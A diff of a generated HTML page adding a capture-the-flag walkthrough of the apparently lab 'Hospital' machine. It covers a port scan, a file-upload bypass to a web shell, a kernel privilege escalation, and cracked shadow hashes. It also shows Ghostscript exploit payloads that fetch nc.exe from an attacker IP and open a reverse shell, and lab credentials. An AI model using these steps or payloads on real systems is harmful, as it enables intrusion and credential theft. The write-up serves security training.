@@ -2960,6 +2960,33 @@
     Foothold
   </a>
   
+    <nav class="md-nav" aria-label="Foothold">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#8080-upload" class="md-nav__link">
+    8080 - upload
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#container-priv-esca" class="md-nav__link">
+    container priv esca
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#443-mail-service" class="md-nav__link">
+    443 - mail service
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
       
         <li class="md-nav__item">
@@ -3270,6 +3297,33 @@
     Foothold
   </a>
   
+    <nav class="md-nav" aria-label="Foothold">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#8080-upload" class="md-nav__link">
+    8080 - upload
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#container-priv-esca" class="md-nav__link">
+    container priv esca
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#443-mail-service" class="md-nav__link">
+    443 - mail service
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
       
         <li class="md-nav__item">
@@ -3306,9 +3360,188 @@
 <h2 id="machine-info">Machine Info<a class="headerlink" href="#machine-info" title="Permanent link">&para;</a></h2>
 <p><img alt="image-20231205091749572" src="../Hospital.assets/image-20231205091749572.png" /></p>
 <h2 id="recon">Recon<a class="headerlink" href="#recon" title="Permanent link">&para;</a></h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>PORT      STATE SERVICE           VERSION
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>22/tcp    open  ssh               OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>| ssh-hostkey:
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>|   256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa (ECDSA)
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>|_  256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca (ED25519)
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>53/tcp    open  domain            Simple DNS Plus
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2023-12-05 05:44:03Z)
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>135/tcp   open  msrpc             Microsoft Windows RPC
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>| ssl-cert: Subject: commonName=DC
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>| Not valid before: 2023-09-06T10:49:03
+</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>|_Not valid after:  2028-09-06T10:49:03
+</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a>443/tcp   open  ssl/http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
+</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>| ssl-cert: Subject: commonName=localhost
+</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a>| Not valid before: 2009-11-10T23:48:47
+</span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a>|_Not valid after:  2019-11-08T23:48:47
+</span><span id="__span-0-19"><a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a>|_http-title: Hospital Webmail :: Welcome to Hospital Webmail
+</span><span id="__span-0-20"><a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a>|_ssl-date: TLS randomness does not represent time
+</span><span id="__span-0-21"><a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a>| tls-alpn:
+</span><span id="__span-0-22"><a id="__codelineno-0-22" name="__codelineno-0-22" href="#__codelineno-0-22"></a>|_  http/1.1
+</span><span id="__span-0-23"><a id="__codelineno-0-23" name="__codelineno-0-23" href="#__codelineno-0-23"></a>|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
+</span><span id="__span-0-24"><a id="__codelineno-0-24" name="__codelineno-0-24" href="#__codelineno-0-24"></a>445/tcp   open  microsoft-ds?
+</span><span id="__span-0-25"><a id="__codelineno-0-25" name="__codelineno-0-25" href="#__codelineno-0-25"></a>464/tcp   open  kpasswd5?
+</span><span id="__span-0-26"><a id="__codelineno-0-26" name="__codelineno-0-26" href="#__codelineno-0-26"></a>593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+</span><span id="__span-0-27"><a id="__codelineno-0-27" name="__codelineno-0-27" href="#__codelineno-0-27"></a>636/tcp   open  ldapssl?
+</span><span id="__span-0-28"><a id="__codelineno-0-28" name="__codelineno-0-28" href="#__codelineno-0-28"></a>| ssl-cert: Subject: commonName=DC
+</span><span id="__span-0-29"><a id="__codelineno-0-29" name="__codelineno-0-29" href="#__codelineno-0-29"></a>| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
+</span><span id="__span-0-30"><a id="__codelineno-0-30" name="__codelineno-0-30" href="#__codelineno-0-30"></a>| Not valid before: 2023-09-06T10:49:03
+</span><span id="__span-0-31"><a id="__codelineno-0-31" name="__codelineno-0-31" href="#__codelineno-0-31"></a>|_Not valid after:  2028-09-06T10:49:03
+</span><span id="__span-0-32"><a id="__codelineno-0-32" name="__codelineno-0-32" href="#__codelineno-0-32"></a>1801/tcp  open  msmq?
+</span><span id="__span-0-33"><a id="__codelineno-0-33" name="__codelineno-0-33" href="#__codelineno-0-33"></a>2103/tcp  open  msrpc             Microsoft Windows RPC
+</span><span id="__span-0-34"><a id="__codelineno-0-34" name="__codelineno-0-34" href="#__codelineno-0-34"></a>2105/tcp  open  msrpc             Microsoft Windows RPC
+</span><span id="__span-0-35"><a id="__codelineno-0-35" name="__codelineno-0-35" href="#__codelineno-0-35"></a>2107/tcp  open  msrpc             Microsoft Windows RPC
+</span><span id="__span-0-36"><a id="__codelineno-0-36" name="__codelineno-0-36" href="#__codelineno-0-36"></a>2179/tcp  open  vmrdp?
+</span><span id="__span-0-37"><a id="__codelineno-0-37" name="__codelineno-0-37" href="#__codelineno-0-37"></a>3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
+</span><span id="__span-0-38"><a id="__codelineno-0-38" name="__codelineno-0-38" href="#__codelineno-0-38"></a>| ssl-cert: Subject: commonName=DC
+</span><span id="__span-0-39"><a id="__codelineno-0-39" name="__codelineno-0-39" href="#__codelineno-0-39"></a>| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
+</span><span id="__span-0-40"><a id="__codelineno-0-40" name="__codelineno-0-40" href="#__codelineno-0-40"></a>| Not valid before: 2023-09-06T10:49:03
+</span><span id="__span-0-41"><a id="__codelineno-0-41" name="__codelineno-0-41" href="#__codelineno-0-41"></a>|_Not valid after:  2028-09-06T10:49:03
+</span><span id="__span-0-42"><a id="__codelineno-0-42" name="__codelineno-0-42" href="#__codelineno-0-42"></a>3269/tcp  open  globalcatLDAPssl?
+</span><span id="__span-0-43"><a id="__codelineno-0-43" name="__codelineno-0-43" href="#__codelineno-0-43"></a>| ssl-cert: Subject: commonName=DC
+</span><span id="__span-0-44"><a id="__codelineno-0-44" name="__codelineno-0-44" href="#__codelineno-0-44"></a>| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
+</span><span id="__span-0-45"><a id="__codelineno-0-45" name="__codelineno-0-45" href="#__codelineno-0-45"></a>| Not valid before: 2023-09-06T10:49:03
+</span><span id="__span-0-46"><a id="__codelineno-0-46" name="__codelineno-0-46" href="#__codelineno-0-46"></a>|_Not valid after:  2028-09-06T10:49:03
+</span><span id="__span-0-47"><a id="__codelineno-0-47" name="__codelineno-0-47" href="#__codelineno-0-47"></a>3389/tcp  open  ms-wbt-server     Microsoft Terminal Services
+</span><span id="__span-0-48"><a id="__codelineno-0-48" name="__codelineno-0-48" href="#__codelineno-0-48"></a>| rdp-ntlm-info:
+</span><span id="__span-0-49"><a id="__codelineno-0-49" name="__codelineno-0-49" href="#__codelineno-0-49"></a>|   Target_Name: HOSPITAL
+</span><span id="__span-0-50"><a id="__codelineno-0-50" name="__codelineno-0-50" href="#__codelineno-0-50"></a>|   NetBIOS_Domain_Name: HOSPITAL
+</span><span id="__span-0-51"><a id="__codelineno-0-51" name="__codelineno-0-51" href="#__codelineno-0-51"></a>|   NetBIOS_Computer_Name: DC
+</span><span id="__span-0-52"><a id="__codelineno-0-52" name="__codelineno-0-52" href="#__codelineno-0-52"></a>|   DNS_Domain_Name: hospital.htb
+</span><span id="__span-0-53"><a id="__codelineno-0-53" name="__codelineno-0-53" href="#__codelineno-0-53"></a>|   DNS_Computer_Name: DC.hospital.htb
+</span><span id="__span-0-54"><a id="__codelineno-0-54" name="__codelineno-0-54" href="#__codelineno-0-54"></a>|   DNS_Tree_Name: hospital.htb
+</span><span id="__span-0-55"><a id="__codelineno-0-55" name="__codelineno-0-55" href="#__codelineno-0-55"></a>|   Product_Version: 10.0.17763
+</span><span id="__span-0-56"><a id="__codelineno-0-56" name="__codelineno-0-56" href="#__codelineno-0-56"></a>|_  System_Time: 2023-12-05T05:45:01+00:00
+</span><span id="__span-0-57"><a id="__codelineno-0-57" name="__codelineno-0-57" href="#__codelineno-0-57"></a>| ssl-cert: Subject: commonName=DC.hospital.htb
+</span><span id="__span-0-58"><a id="__codelineno-0-58" name="__codelineno-0-58" href="#__codelineno-0-58"></a>| Not valid before: 2023-09-05T18:39:34
+</span><span id="__span-0-59"><a id="__codelineno-0-59" name="__codelineno-0-59" href="#__codelineno-0-59"></a>|_Not valid after:  2024-03-06T18:39:34
+</span><span id="__span-0-60"><a id="__codelineno-0-60" name="__codelineno-0-60" href="#__codelineno-0-60"></a>5985/tcp  open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+</span><span id="__span-0-61"><a id="__codelineno-0-61" name="__codelineno-0-61" href="#__codelineno-0-61"></a>|_http-title: Not Found
+</span><span id="__span-0-62"><a id="__codelineno-0-62" name="__codelineno-0-62" href="#__codelineno-0-62"></a>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span><span id="__span-0-63"><a id="__codelineno-0-63" name="__codelineno-0-63" href="#__codelineno-0-63"></a>6404/tcp  open  msrpc             Microsoft Windows RPC
+</span><span id="__span-0-64"><a id="__codelineno-0-64" name="__codelineno-0-64" href="#__codelineno-0-64"></a>6406/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+</span><span id="__span-0-65"><a id="__codelineno-0-65" name="__codelineno-0-65" href="#__codelineno-0-65"></a>6407/tcp  open  msrpc             Microsoft Windows RPC
+</span><span id="__span-0-66"><a id="__codelineno-0-66" name="__codelineno-0-66" href="#__codelineno-0-66"></a>6409/tcp  open  msrpc             Microsoft Windows RPC
+</span><span id="__span-0-67"><a id="__codelineno-0-67" name="__codelineno-0-67" href="#__codelineno-0-67"></a>6613/tcp  open  msrpc             Microsoft Windows RPC
+</span><span id="__span-0-68"><a id="__codelineno-0-68" name="__codelineno-0-68" href="#__codelineno-0-68"></a>6632/tcp  open  msrpc             Microsoft Windows RPC
+</span><span id="__span-0-69"><a id="__codelineno-0-69" name="__codelineno-0-69" href="#__codelineno-0-69"></a>8080/tcp  open  http              Apache httpd 2.4.55 ((Ubuntu))
+</span><span id="__span-0-70"><a id="__codelineno-0-70" name="__codelineno-0-70" href="#__codelineno-0-70"></a>|_http-open-proxy: Proxy might be redirecting requests
+</span><span id="__span-0-71"><a id="__codelineno-0-71" name="__codelineno-0-71" href="#__codelineno-0-71"></a>| http-title: Login
+</span><span id="__span-0-72"><a id="__codelineno-0-72" name="__codelineno-0-72" href="#__codelineno-0-72"></a>|_Requested resource was login.php
+</span><span id="__span-0-73"><a id="__codelineno-0-73" name="__codelineno-0-73" href="#__codelineno-0-73"></a>| http-cookie-flags:
+</span><span id="__span-0-74"><a id="__codelineno-0-74" name="__codelineno-0-74" href="#__codelineno-0-74"></a>|   /:
+</span><span id="__span-0-75"><a id="__codelineno-0-75" name="__codelineno-0-75" href="#__codelineno-0-75"></a>|     PHPSESSID:
+</span><span id="__span-0-76"><a id="__codelineno-0-76" name="__codelineno-0-76" href="#__codelineno-0-76"></a>|_      httponly flag not set
+</span><span id="__span-0-77"><a id="__codelineno-0-77" name="__codelineno-0-77" href="#__codelineno-0-77"></a>|_http-server-header: Apache/2.4.55 (Ubuntu)
+</span><span id="__span-0-78"><a id="__codelineno-0-78" name="__codelineno-0-78" href="#__codelineno-0-78"></a>9389/tcp  open  mc-nmf            .NET Message Framing
+</span><span id="__span-0-79"><a id="__codelineno-0-79" name="__codelineno-0-79" href="#__codelineno-0-79"></a>21715/tcp open  msrpc             Microsoft Windows RPC
+</span><span id="__span-0-80"><a id="__codelineno-0-80" name="__codelineno-0-80" href="#__codelineno-0-80"></a>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+</span><span id="__span-0-81"><a id="__codelineno-0-81" name="__codelineno-0-81" href="#__codelineno-0-81"></a>Device type: general purpose
+</span><span id="__span-0-82"><a id="__codelineno-0-82" name="__codelineno-0-82" href="#__codelineno-0-82"></a>Running (JUST GUESSING): Linux 5.X (91%)
+</span><span id="__span-0-83"><a id="__codelineno-0-83" name="__codelineno-0-83" href="#__codelineno-0-83"></a>OS CPE: cpe:/o:linux:linux_kernel:5.0
+</span><span id="__span-0-84"><a id="__codelineno-0-84" name="__codelineno-0-84" href="#__codelineno-0-84"></a>Aggressive OS guesses: Linux 5.0 (91%)
+</span><span id="__span-0-85"><a id="__codelineno-0-85" name="__codelineno-0-85" href="#__codelineno-0-85"></a>No exact OS matches for host (test conditions non-ideal).
+</span><span id="__span-0-86"><a id="__codelineno-0-86" name="__codelineno-0-86" href="#__codelineno-0-86"></a>Service Info: Host: DC; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows
+</span></code></pre></div>
+<ul>
+<li>443 SSL: https://hospital.htb/</li>
+<li>8080 HTTP: http://hospital.htb:8080/</li>
+<li>3389 MS WBT Server</li>
+<li>RPC</li>
+</ul>
 <h2 id="foothold">Foothold<a class="headerlink" href="#foothold" title="Permanent link">&para;</a></h2>
+<h3 id="8080-upload">8080 - upload<a class="headerlink" href="#8080-upload" title="Permanent link">&para;</a></h3>
+<ul>
+<li>register a user, qwe:pass</li>
+</ul>
+<p><img alt="image-20231205094651653" src="../Hospital.assets/image-20231205094651653.png" /></p>
+<ul>
+<li>upload 1.png ok, 1.php [x]</li>
+<li>test extention name: php, php1, php2, phtml, ...</li>
+</ul>
+<p><img alt="image-20231205094733009" src="../Hospital.assets/image-20231205094733009.png" /></p>
+<ul>
+<li><code>1.phar</code> [ok]</li>
+<li>enum path: <strong>uploads/</strong></li>
+</ul>
+<p><img alt="image-20231205094808597" src="../Hospital.assets/image-20231205094808597.png" /></p>
+<ul>
+<li>upload a web shell php, https://github.com/flozz/p0wny-shell</li>
+</ul>
+<p><img alt="image-20231205094820025" src="../Hospital.assets/image-20231205094820025.png" /></p>
+<p><img alt="image-20231205094858093" src="../Hospital.assets/image-20231205094858093.png" /></p>
+<ul>
+<li>get rshell on the local</li>
+</ul>
+<p><img alt="image-20231205094913738" src="../Hospital.assets/image-20231205094913738.png" /></p>
+<p><img alt="image-20231205094917151" src="../Hospital.assets/image-20231205094917151.png" /></p>
+<ul>
+<li>check ip addr -&gt; inside a container WSL/Docker</li>
+</ul>
+<h3 id="container-priv-esca">container priv esca<a class="headerlink" href="#container-priv-esca" title="Permanent link">&para;</a></h3>
+<ul>
+<li>check sys info -&gt; kernel version <strong>5.19.0</strong></li>
+</ul>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>www-data@webserver:/$<span class="w"> </span>uname<span class="w"> </span>-a
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>Linux<span class="w"> </span>webserver<span class="w"> </span><span class="m">5</span>.19.0-35-generic<span class="w"> </span><span class="c1">#36-Ubuntu SMP PREEMPT_DYNAMIC Fri Feb 3 18:36:56 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux</span>
+</span></code></pre></div>
+<ul>
+<li><a href="https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629">g1vi/CVE-2023-2640-CVE-2023-32629: GameOver(lay) Ubuntu Privilege Escalation (github.com)</a></li>
+<li>get root shell</li>
+</ul>
+<p><img alt="image-20231205095130285" src="../Hospital.assets/image-20231205095130285.png" /></p>
+<ul>
+<li>check <strong>shadow</strong> file to get hash</li>
+</ul>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>root:<span class="nv">$y$j9T$s</span>/Aqv48x449udndpLC6eC.<span class="nv">$WUkrXgkW46N4xdpnhMoax7US</span>.JgyJSeobZ1dzDs..dD:19612:0:99999:7:::
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>drwilliams:<span class="nv">$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w</span>/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::
+</span></code></pre></div>
+<ul>
+<li>hashcat to crack hash -&gt; <strong>drwilliams:qwe123!@#</strong></li>
+</ul>
+<p><img alt="image-20231205095209311" src="../Hospital.assets/image-20231205095209311.png" /></p>
+<h3 id="443-mail-service">443 - mail service<a class="headerlink" href="#443-mail-service" title="Permanent link">&para;</a></h3>
+<ul>
+<li><strong>login</strong>: https://10.10.11.241/?_task=mail&amp;_mbox=INBOX, by cred <strong>drwilliams:qwe123!@#</strong></li>
+</ul>
+<p><img alt="image-20231205095323350" src="../Hospital.assets/image-20231205095323350.png" /></p>
+<ul>
+<li>recon: <strong>.eps</strong> file (used by <strong>GhostScript</strong>) -&gt; <a href="https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection/tree/main">jakabakos/CVE-2023-36664-Ghostscript-command-injection: Ghostscript command injection vulnerability PoC (CVE-2023-36664) (github.com)</a></li>
+</ul>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>python3<span class="w"> </span>CVE_2023_36664_exploit.py<span class="w"> </span>--inject<span class="w"> </span>--payload<span class="w"> </span><span class="s2">&quot;curl -O http://10.10.14.15/nc.exe&quot;</span><span class="w"> </span>--filename<span class="w"> </span>file.eps
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>python3<span class="w"> </span>CVE_2023_36664_exploit.py<span class="w"> </span>--inject<span class="w"> </span>--payload<span class="w"> </span><span class="s2">&quot;nc.exe 10.10.14.15 1234 -e cmd.exe&quot;</span><span class="w"> </span>--filename<span class="w"> </span>file.eps
+</span></code></pre></div>
+<ul>
+<li>write two emails <strong>attached</strong> with each file.eps -&gt; get windows user shell</li>
+</ul>
+<p><img alt="image-20231205095444319" src="../Hospital.assets/image-20231205095444319.png" /></p>
 <h2 id="privilege-escalation">Privilege Escalation<a class="headerlink" href="#privilege-escalation" title="Permanent link">&para;</a></h2>
+<ul>
+<li>find a powershell script</li>
+</ul>
+<p><img alt="image-20231205095653546" src="../Hospital.assets/image-20231205095653546.png" /></p>
+<ul>
+<li>cred: <strong>hospital/drbrown:chr!$br0wn</strong></li>
+<li>use this cred to conn RPC</li>
+<li>enum RPC: <code>querydispinfo</code>; ref: <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration?source=post_page-----791ad6dd24ed--------------------------------">rpcclient enumeration - HackTricks</a></li>
+</ul>
+<p><img alt="image-20231205095738521" src="../Hospital.assets/image-20231205095738521.png" /></p>
+<ul>
+<li>Administrator and Guest share some information together.</li>
+<li>check dir's ACL -&gt; <strong>xampp</strong>, <strong>Append Data</strong> + <strong>Write Data</strong> [ok]</li>
+</ul>
+<p><img alt="image-20231205100108338" src="../Hospital.assets/image-20231205100108338.png" /></p>
+<ul>
+<li>curl web php shell file into home path, visit it on browser to get admin shell</li>
+</ul>
+<p><img alt="image-20231205100245920" src="../Hospital.assets/image-20231205100245920.png" /></p>
+<p><img alt="image-20231205100249077" src="../Hospital.assets/image-20231205100249077.png" /></p>
 <h2 id="exploit-chain">Exploit Chain<a class="headerlink" href="#exploit-chain" title="Permanent link">&para;</a></h2>
+<p>upload exp -&gt; web shell -&gt; reverse shell -&gt; container priv esca -&gt; root priv -&gt; cat shadow -&gt; hash crack -&gt; mail service login -&gt; inject cmd into eps file -&gt; email victim to trigger -&gt; get win user priv shell -&gt; admin + guest shared information -&gt; curl down web shell -&gt; admin priv shell</p>
 
 
 
